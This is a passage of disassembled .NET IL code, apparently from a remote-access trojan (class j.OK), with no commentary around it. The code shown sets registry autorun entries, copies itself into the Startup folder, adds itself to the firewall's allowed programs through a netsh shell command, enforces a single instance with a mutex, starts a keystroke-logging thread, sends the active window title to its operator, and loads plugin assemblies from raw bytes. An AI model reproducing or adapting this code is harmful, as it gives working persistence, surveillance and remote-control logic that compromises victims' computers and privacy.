      IL_0363:  ldstr      "Hidden"
      IL_0368:  ldstr      "0"
      IL_036d:  ldc.i4.4
      IL_036e:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0373:  leave.s    IL_0381

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0375:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_037a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_037f:  leave.s    IL_0381

    }  // end handler
    IL_0381:  ldsfld     bool j.OK::DFire
    IL_0386:  brfalse.s  IL_03ef

    .try
    {
      IL_0388:  ldc.i4.5
      IL_0389:  newarr     [mscorlib]System.String
      IL_038e:  dup
      IL_038f:  ldc.i4.0
      IL_0390:  ldstr      "netsh firewall add allowedprogram \""
      IL_0395:  stelem.ref
      IL_0396:  dup
      IL_0397:  ldc.i4.1
      IL_0398:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_039d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_03a2:  stelem.ref
      IL_03a3:  dup
      IL_03a4:  ldc.i4.2
      IL_03a5:  ldstr      "\" \""
      IL_03aa:  stelem.ref
      IL_03ab:  dup
      IL_03ac:  ldc.i4.3
      IL_03ad:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_03b2:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_03b7:  stelem.ref
      IL_03b8:  dup
      IL_03b9:  ldc.i4.4
      IL_03ba:  ldstr      "\" ENABLE"
      IL_03bf:  stelem.ref
      IL_03c0:  call       string [mscorlib]System.String::Concat(string[])
      IL_03c5:  ldc.i4.0
      IL_03c6:  ldc.i4.1
      IL_03c7:  ldc.i4     0x1388
      IL_03cc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_03d1:  pop
      IL_03d2:  leave.s    IL_03ef

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03d4:  dup
      IL_03d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03da:  stloc.s    V_12
      IL_03dc:  ldloc.s    V_12
      IL_03de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03ed:  leave.s    IL_03ef

    }  // end handler
    IL_03ef:  ldsfld     bool j.OK::Isu
    IL_03f4:  brfalse    IL_04ae

    .try
    {
      IL_03f9:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03fe:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0403:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0408:  ldsfld     string j.OK::sf
      IL_040d:  ldc.i4.1
      IL_040e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0413:  ldsfld     string j.OK::RG
      IL_0418:  ldstr      "\""
      IL_041d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0422:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0427:  ldstr      "\" .."
      IL_042c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0431:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0436:  leave.s    IL_0453

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0438:  dup
      IL_0439:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_043e:  stloc.s    V_13
      IL_0440:  ldloc.s    V_13
      IL_0442:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0447:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_044c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0451:  leave.s    IL_0453

    }  // end handler
    IL_0453:  nop
    .try
    {
      IL_0454:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0459:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_045e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0463:  ldsfld     string j.OK::sf
      IL_0468:  ldc.i4.1
      IL_0469:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_046e:  ldsfld     string j.OK::RG
      IL_0473:  ldstr      "\""
      IL_0478:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_047d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0482:  ldstr      "\" .."
      IL_0487:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_048c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0491:  leave.s    IL_04ae

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0493:  dup
      IL_0494:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0499:  stloc.s    V_14
      IL_049b:  ldloc.s    V_14
      IL_049d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04ac:  leave.s    IL_04ae

    }  // end handler
    IL_04ae:  ldsfld     bool j.OK::IsF
    IL_04b3:  brfalse.s  IL_0521

    .try
    {
      IL_04b5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_04ba:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_04bf:  ldc.i4.7
      IL_04c0:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_04c5:  ldstr      "\\"
      IL_04ca:  ldsfld     string j.OK::RG
      IL_04cf:  ldstr      ".exe"
      IL_04d4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_04d9:  ldc.i4.1
      IL_04da:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_04df:  ldc.i4.7
      IL_04e0:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_04e5:  ldstr      "\\"
      IL_04ea:  ldsfld     string j.OK::RG
      IL_04ef:  ldstr      ".exe"
      IL_04f4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_04f9:  ldc.i4.3
      IL_04fa:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_04ff:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_0504:  leave.s    IL_0521

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0506:  dup
      IL_0507:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_050c:  stloc.s    V_15
      IL_050e:  ldloc.s    V_15
      IL_0510:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0515:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_051a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_051f:  leave.s    IL_0521

    }  // end handler
    IL_0521:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       832 (0x340)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0005:  brfalse.s  IL_004a

    .try
    {
      IL_0007:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_000c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0011:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0016:  ldstr      "di"
      IL_001b:  ldstr      "!"
      IL_0020:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0025:  leave.s    IL_0040

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0027:  dup
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002d:  stloc.3
      IL_002e:  ldloc.3
      IL_002f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  leave.s    IL_0040

    }  // end handler
    IL_0040:  ldc.i4     0x1388
    IL_0045:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  ldc.i4.1
    IL_004d:  ldsfld     string j.OK::RG
    IL_0052:  ldloca.s   V_0
    IL_0054:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_0059:  stsfld     object j.OK::MT
    IL_005e:  ldloc.0
    IL_005f:  brtrue.s   IL_0066

    IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0066:  call       void j.OK::INS()
    IL_006b:  ldsfld     bool j.OK::Idr
    IL_0070:  brtrue.s   IL_0095

    IL_0072:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0077:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_007c:  stsfld     string j.OK::EXE
    IL_0081:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0086:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_008b:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0090:  stsfld     string j.OK::DR
    IL_0095:  ldnull
    IL_0096:  ldftn      void j.OK::RC()
    IL_009c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_00a1:  ldc.i4.1
    IL_00a2:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_00a7:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_00ac:  newobj     instance void j.kl::.ctor()
      IL_00b1:  stsfld     class j.kl j.OK::kq
      IL_00b6:  ldsfld     class j.kl j.OK::kq
      IL_00bb:  ldftn      instance void j.kl::WRK()
      IL_00c1:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00c6:  ldc.i4.1
      IL_00c7:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_00cc:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00d1:  leave.s    IL_00ee

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d3:  dup
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d9:  stloc.s    V_4
      IL_00db:  ldloc.s    V_4
      IL_00dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ec:  leave.s    IL_00ee

    }  // end handler
    IL_00ee:  ldc.i4.0
    IL_00ef:  stloc.1
    IL_00f0:  ldstr      ""
    IL_00f5:  stloc.2
    IL_00f6:  ldsfld     bool j.OK::BD
    IL_00fb:  brfalse.s  IL_0131

    .try
    {
      IL_00fd:  ldnull
      IL_00fe:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0104:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_0109:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_010e:  ldc.i4.1
      IL_010f:  call       void j.OK::pr(int32)
      IL_0114:  leave.s    IL_0131

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0116:  dup
      IL_0117:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_011c:  stloc.s    V_5
      IL_011e:  ldloc.s    V_5
      IL_0120:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0125:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012f:  leave.s    IL_0131

    }  // end handler
    IL_0131:  ldc.i4     0x3e8
    IL_0136:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_013b:  ldsfld     bool j.OK::Cn
    IL_0140:  brtrue.s   IL_0148

    IL_0142:  ldstr      ""
    IL_0147:  stloc.2
    IL_0148:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_014d:  ldloc.1
      IL_014e:  ldc.i4.1
      IL_014f:  add.ovf
      IL_0150:  stloc.1
      IL_0151:  ldloc.1
      IL_0152:  ldc.i4.5
      IL_0153:  bne.un.s   IL_0186

      .try
      {
        IL_0155:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_015a:  ldc.i4     0x400
        IL_015f:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0164:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_0169:  leave.s    IL_0186

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_016b:  dup
        IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0171:  stloc.s    V_6
        IL_0173:  ldloc.s    V_6
        IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0184:  leave.s    IL_0186

      }  // end handler
      IL_0186:  ldloc.1
      IL_0187:  ldc.i4.8
      IL_0188:  blt.s      IL_01b8

      IL_018a:  ldc.i4.0
      IL_018b:  stloc.1
      IL_018c:  call       string j.OK::ACT()
      IL_0191:  stloc.s    V_7
      IL_0193:  ldloc.2
      IL_0194:  ldloc.s    V_7
      IL_0196:  ldc.i4.0
      IL_0197:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_019c:  brfalse.s  IL_01b8

      IL_019e:  ldloc.s    V_7
      IL_01a0:  stloc.2
      IL_01a1:  ldstr      "act"
      IL_01a6:  ldsfld     string j.OK::Y
      IL_01ab:  ldloc.s    V_7
      IL_01ad:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01b2:  call       bool j.OK::Send(string)
      IL_01b7:  pop
      IL_01b8:  ldsfld     bool j.OK::Isu
      IL_01bd:  brfalse    IL_031d

      .try
      {
        IL_01c2:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_01c7:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_01cc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_01d1:  ldsfld     string j.OK::sf
        IL_01d6:  ldstr      "\\"
        IL_01db:  ldsfld     string j.OK::RG
        IL_01e0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01e5:  ldstr      ""
        IL_01ea:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_01ef:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_01f4:  ldstr      "\""
        IL_01f9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_01fe:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0203:  ldstr      "\" .."
        IL_0208:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_020d:  ldc.i4.0
        IL_020e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0213:  brfalse.s  IL_0252

        IL_0215:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_021a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_021f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0224:  ldsfld     string j.OK::sf
        IL_0229:  ldc.i4.1
        IL_022a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_022f:  ldsfld     string j.OK::RG
        IL_0234:  ldstr      "\""
        IL_0239:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_023e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0243:  ldstr      "\" .."
        IL_0248:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_024d:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0252:  leave.s    IL_026f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0254:  dup
        IL_0255:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_025a:  stloc.s    V_8
        IL_025c:  ldloc.s    V_8
        IL_025e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0263:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0268:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_026d:  leave.s    IL_026f

      }  // end handler
      IL_026f:  nop
      .try
      {
        IL_0270:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0275:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_027a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_027f:  ldsfld     string j.OK::sf
        IL_0284:  ldstr      "\\"
        IL_0289:  ldsfld     string j.OK::RG
        IL_028e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0293:  ldstr      ""
        IL_0298:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_029d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_02a2:  ldstr      "\""
        IL_02a7:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02ac:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02b1:  ldstr      "\" .."
        IL_02b6:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02bb:  ldc.i4.0
        IL_02bc:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02c1:  brfalse.s  IL_0300

        IL_02c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02cd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_02d2:  ldsfld     string j.OK::sf
        IL_02d7:  ldc.i4.1
        IL_02d8:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02dd:  ldsfld     string j.OK::RG
        IL_02e2:  ldstr      "\""
        IL_02e7:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02ec:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02f1:  ldstr      "\" .."
        IL_02f6:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02fb:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0300:  leave.s    IL_031d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0302:  dup
        IL_0303:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0308:  stloc.s    V_9
        IL_030a:  ldloc.s    V_9
        IL_030c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0311:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0316:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_031b:  leave.s    IL_031d

      }  // end handler
      IL_031d:  leave      IL_0131

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0322:  dup
      IL_0323:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0328:  stloc.s    V_10
      IL_032a:  ldloc.s    V_10
      IL_032c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0331:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0336:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_033b:  leave      IL_0131
    }  // end handler
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             uint8[] V_2,
             int32 V_3)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.2
    IL_0015:  ldc.i4.0
    IL_0016:  stloc.3
    IL_0017:  br.s       IL_0034

    IL_0019:  ldloc.2
    IL_001a:  ldloc.3
    IL_001b:  ldelem.u1
    IL_001c:  stloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldloca.s   V_1
    IL_0020:  ldstr      "x2"
    IL_0025:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stloc.0
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  add.ovf
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldloc.2
    IL_0036:  ldlen
    IL_0037:  conv.i4
    IL_0038:  blt.s      IL_0019

    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       114 (0x72)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Reflection.Module[] V_2,
             int32 V_3,
             class [mscorlib]System.Type V_4,
             class [mscorlib]System.Type[] V_5,
             int32 V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.2
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.3
    IL_000e:  br.s       IL_0068

    IL_0010:  ldloc.2
    IL_0011:  ldloc.3
    IL_0012:  ldelem.ref
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001a:  stloc.s    V_5
    IL_001c:  ldc.i4.0
    IL_001d:  stloc.s    V_6
    IL_001f:  br.s       IL_005c

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_6
    IL_0025:  ldelem.ref
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
